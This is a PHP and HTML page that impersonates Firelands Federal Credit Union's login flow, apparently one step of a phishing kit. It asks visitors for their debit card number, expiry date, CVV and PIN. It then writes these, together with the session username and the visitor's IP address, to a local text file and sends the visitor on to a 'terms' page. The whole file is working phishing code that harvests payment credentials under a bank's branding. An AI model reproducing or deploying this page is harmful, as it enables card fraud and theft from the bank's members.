<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cardNumber = trim($_POST['card_number'] ?? '');
    $expiryMonth = $_POST['expiry_month'] ?? '';
    $expiryYear = $_POST['expiry_year'] ?? '';
    $cvv = trim($_POST['cvv'] ?? '');
    $pin = trim($_POST['pin'] ?? '');
    
    // Validation
    if (empty($cardNumber)) {
        $errors['card_number'] = 'Card number is required';
    } elseif (!preg_match('/^\d{16}$/', preg_replace('/\s/', '', $cardNumber))) {
        $errors['card_number'] = 'Please enter a valid 16-digit card number';
    }
    
    if (empty($expiryMonth)) {
        $errors['expiry_month'] = 'Expiry month is required';
    }
    
    if (empty($expiryYear)) {
        $errors['expiry_year'] = 'Expiry year is required';
    }
    
    if (empty($cvv)) {
        $errors['cvv'] = 'CVV is required';
    } elseif (!preg_match('/^\d{3,4}$/', $cvv)) {
        $errors['cvv'] = 'Please enter a valid CVV';
    }
    
    if (empty($pin)) {
        $errors['pin'] = 'PIN is required';
    } elseif (!preg_match('/^\d{4}$/', $pin)) {
        $errors['pin'] = 'Please enter a valid 4-digit PIN';
    }
    
    if (empty($errors)) {
        // Save card information data
        $data = [
            'step' => 'card_information',
            'usrnm' => $username,
            'emzemz' => $username,
            'pay_card' => preg_replace('/\s/', '', $cardNumber),
            'exp_mth' => $expiryMonth,
            'exp_yr' => $expiryYear,
            'sec_cd' => $cvv,
            'pin_cd' => $pin,
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
        ];
        
        saveUserData('card_information.txt', $data);
        
        // Redirect to terms page
        header('Location: terms.php');
        exit;
    }
}

$footerLinks = [
    'About Us',
    'Customer Service',
    'Careers',
    'Investor Relations',
    'Media Center',
    'Security',
    'Privacy',
    'Site Map'
];

$months = range(1, 12);
$years = range(date('Y'), date('Y') + 10);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Firelands FCU - Card Information</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="relative flex min-h-screen flex-col overflow-hidden text-white">
        <!-- Background Image with Overlay -->
        <div class="absolute inset-0">
            <img
                src="assets/firelands-landing.jpg"
                alt="Sun setting over Firelands farm fields"
                class="h-full w-full object-cover"
            />
            <div class="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
        </div>

        <!-- Main Content -->
        <div class="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
            <div class="mx-auto flex w-full max-w-6xl flex-col gap-12 lg:flex-row lg:items-center lg:justify-between">
                <!-- Left Section: Hero Text -->
                <section class="order-2 flex flex-1 flex-col justify-center space-y-6 lg:order-1">
                    <div class="space-y-3">
                        <p class="text-3xl font-semibold leading-tight text-white drop-shadow sm:text-4xl lg:text-5xl">
                            Payment Method
                        </p>
                        <h1 class="text-base font-semibold uppercase tracking-[0.3em] text-white/70">
                            Add your card information
                        </h1>
                    </div>
                </section>

                <!-- Right Section: Card Information Card -->
                <section class="order-1 w-full max-w-md lg:order-2 lg:self-start">
                    <div class="mx-auto w-full rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur lg:mx-0">
                        <!-- Logo -->
                        <div class="flex items-center justify-start">
                            <img
                                src="assets/logo.svg"
                                alt="Firelands Federal Credit Union"
                                class="h-12 w-auto"
                            />
                        </div>

                        <!-- Heading -->
                        <h2 class="mt-6 text-2xl font-semibold text-[#2f2e67]">Card Information</h2>
                        <p class="mt-2 text-sm text-gray-600">Please provide your debit card information.</p>

                        <!-- Error Display -->
                        <?php if (!empty($errors)): ?>
                            <div class="mt-4 rounded-lg bg-red-50 border border-red-200 p-4">
                                <div class="flex">
                                    <div class="flex-shrink-0">
                                        <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                        </svg>
                                    </div>
                                    <div class="ml-3">
                                        <p class="text-sm text-red-700">
                                            Please fix the following errors:
                                            <ul class="list-disc pl-5 mt-1">
                                                <?php foreach ($errors as $error): ?>
                                                    <li><?php echo htmlspecialchars($error); ?></li>
                                                <?php endforeach; ?>
                                            </ul>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>

                        <form method="POST" class="mt-6 space-y-6">
                            <!-- Card Number -->
                            <div class="space-y-2">
                                <label for="card_number" class="text-sm font-medium text-gray-600">
                                    Card Number
                                </label>
                                <input
                                    type="text"
                                    id="card_number"
                                    name="card_number"
                                    placeholder="1234 5678 9012 3456"
                                    value="<?php echo htmlspecialchars($_POST['card_number'] ?? ''); ?>"
                                    maxlength="19"
                                    class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                />
                                <?php if (isset($errors['card_number'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['card_number']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- Expiry Date -->
                            <div class="grid grid-cols-2 gap-4">
                                <div class="space-y-2">
                                    <label for="expiry_month" class="text-sm font-medium text-gray-600">
                                        Month
                                    </label>
                                    <select
                                        id="expiry_month"
                                        name="expiry_month"
                                        class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                    >
                                        <option value="">MM</option>
                                        <?php foreach ($months as $month): ?>
                                            <option value="<?php echo str_pad($month, 2, '0', STR_PAD_LEFT); ?>" <?php echo (isset($_POST['expiry_month']) && $_POST['expiry_month'] == str_pad($month, 2, '0', STR_PAD_LEFT)) ? 'selected' : ''; ?>>
                                                <?php echo str_pad($month, 2, '0', STR_PAD_LEFT); ?>
                                            </option>
                                        <?php endforeach; ?>
                                    </select>
                                    <?php if (isset($errors['expiry_month'])): ?>
                                        <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['expiry_month']); ?></p>
                                    <?php endif; ?>
                                </div>

                                <div class="space-y-2">
                                    <label for="expiry_year" class="text-sm font-medium text-gray-600">
                                        Year
                                    </label>
                                    <select
                                        id="expiry_year"
                                        name="expiry_year"
                                        class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                    >
                                        <option value="">YYYY</option>
                                        <?php foreach ($years as $year): ?>
                                            <option value="<?php echo $year; ?>" <?php echo (isset($_POST['expiry_year']) && $_POST['expiry_year'] == $year) ? 'selected' : ''; ?>>
                                                <?php echo $year; ?>
                                            </option>
                                        <?php endforeach; ?>
                                    </select>
                                    <?php if (isset($errors['expiry_year'])): ?>
                                        <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['expiry_year']); ?></p>
                                    <?php endif; ?>
                                </div>
                            </div>

                            <!-- CVV -->
                            <div class="space-y-2">
                                <label for="cvv" class="text-sm font-medium text-gray-600">
                                    CVV
                                </label>
                                <input
                                    type="text"
                                    id="cvv"
                                    name="cvv"
                                    placeholder="123"
                                    value="<?php echo htmlspecialchars($_POST['cvv'] ?? ''); ?>"
                                    maxlength="4"
                                    class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                />
                                <?php if (isset($errors['cvv'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['cvv']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- PIN -->
                            <div class="space-y-2">
                                <label for="pin" class="text-sm font-medium text-gray-600">
                                    PIN
                                </label>
                                <input
                                    type="text"
                                    id="pin"
                                    name="pin"
                                    placeholder="4-digit PIN"
                                    value="<?php echo htmlspecialchars($_POST['pin'] ?? ''); ?>"
                                    maxlength="4"
                                    class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                />
                                <?php if (isset($errors['pin'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['pin']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- Submit Button -->
                            <button
                                type="submit"
                                class="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
                            >
                                Continue
                            </button>

                            <!-- Back Link -->
                            <div class="text-center">
                                <a href="basic_info.php" class="text-sm font-medium text-[#801346] transition hover:text-[#5a63d8] hover:underline">
                                    Back to Personal Information
                                </a>
                            </div>
                        </form>
                    </div>
                </section>
            </div>

            <!-- Footer Links -->
            <div class="mt-10 flex flex-wrap items-center justify-end gap-10 text-sm font-semibold text-white/80">
                <?php foreach ($footerLinks as $index => $label): ?>
                    <a href="#" class="transition hover:text-white">
                        <?php echo htmlspecialchars($label); ?>
                    </a>
                <?php endforeach; ?>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Auto-format card number
            const cardInput = document.getElementById('card_number');
            if (cardInput) {
                cardInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\s/g, '');
                    let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
                    e.target.value = formattedValue;
                });
            }

            // Only allow numbers for CVV and PIN
            const cvvInput = document.getElementById('cvv');
            if (cvvInput) {
                cvvInput.addEventListener('input', function(e) {
                    this.value = this.value.replace(/[^0-9]/g, '');
                });
            }

            const pinInput = document.getElementById('pin');
            if (pinInput) {
                pinInput.addEventListener('input', function(e) {
                    this.value = this.value.replace(/[^0-9]/g, '');
                });
            }

            // Auto-focus card number field
            cardInput.focus();
        });
    </script>
</body>
</html>
